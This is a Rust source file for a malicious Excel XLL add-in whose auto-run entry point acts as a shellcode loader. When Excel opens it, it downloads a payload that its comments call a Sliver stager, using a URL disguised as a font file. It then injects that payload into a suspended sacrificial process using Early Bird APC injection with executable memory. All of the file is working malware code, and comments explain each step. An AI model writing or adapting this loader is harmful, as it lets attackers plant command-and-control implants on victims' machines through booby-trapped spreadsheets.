use std::ffi::{CString, c_void};
use windows::Win32::Foundation::HMODULE;
use windows::Win32::System::LibraryLoader::GetModuleFileNameA;
use windows::Win32::System::Diagnostics::Debug::WriteProcessMemory;
use windows::Win32::System::Memory::{VirtualAllocEx, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE};
use windows::Win32::System::Threading::{CreateProcessA, QueueUserAPC, ResumeThread, CREATE_SUSPENDED, PROCESS_INFORMATION, STARTUPINFOA};
use windows::core::PCSTR;

#[no_mangle]
#[allow(temporary_cstring_as_ptr, non_snake_case)]
fn xlAutoOpen() -> Result<(), Box<dyn std::error::Error>> {
    // Download the Shellcode from the Sliver Stager URL and convert it into bytes so it can be
    // loaded into memory later.
    let shellcode = reqwest::blocking::get("http://192.168.0.100:8000/wahtever.woff");
    if shellcode.is_err() {
        panic!("Can't Get Shellcode");
    }; 
    let unwrapshell = shellcode?.bytes()?;
    // Initialize the startup and process info to be used in CreateProcessA
    let si: STARTUPINFOA = STARTUPINFOA::default();
    let mut pi: PROCESS_INFORMATION = PROCESS_INFORMATION::default();
    unsafe {
        // Get the file path of the program that loaded the XLL which should be excel. Buffer is
        // created to copy the path into, then trimmed of all 0 values in a loop
        let mut buffer = vec![0 as u8; 200];
        GetModuleFileNameA(
            HMODULE::default(), 
            &mut buffer as &mut [u8]
            );
        loop {
            let positiontodelete = buffer.len();
            if buffer[positiontodelete - 1] == 0 {
                buffer.pop();
            } else {
                break;
            };
        };
        // Earlybird APC injection into a sacrificial process
        let createdprocess = CreateProcessA(
            PCSTR(
                CString::new(String::from_utf8(buffer)?)?.as_ptr() as *const u8
                ), 
            windows::core::PSTR::null(),
            None,
            None,
            false,
            CREATE_SUSPENDED,
            None,
            None,
            &si,
            &mut pi
            );
        if createdprocess.is_err() {
            panic!()
        };
        let sacrprocess = pi.hProcess;
        let sacrthread = pi.hThread;
        let shelladdress = VirtualAllocEx(
            sacrprocess,
            None,
            unwrapshell.len(),
            MEM_COMMIT|MEM_RESERVE,
            PAGE_EXECUTE_READWRITE
            );
        let writeaction = WriteProcessMemory(
            sacrprocess,
            shelladdress,
            unwrapshell.as_ptr() as *const c_void,
            unwrapshell.len(),
            None
            );
        if writeaction.is_err() {
            panic!()
        };
        QueueUserAPC(
            std::mem::transmute(shelladdress), 
            sacrthread, 
            0
            );
        ResumeThread(sacrthread);
        Ok(())
    }
}
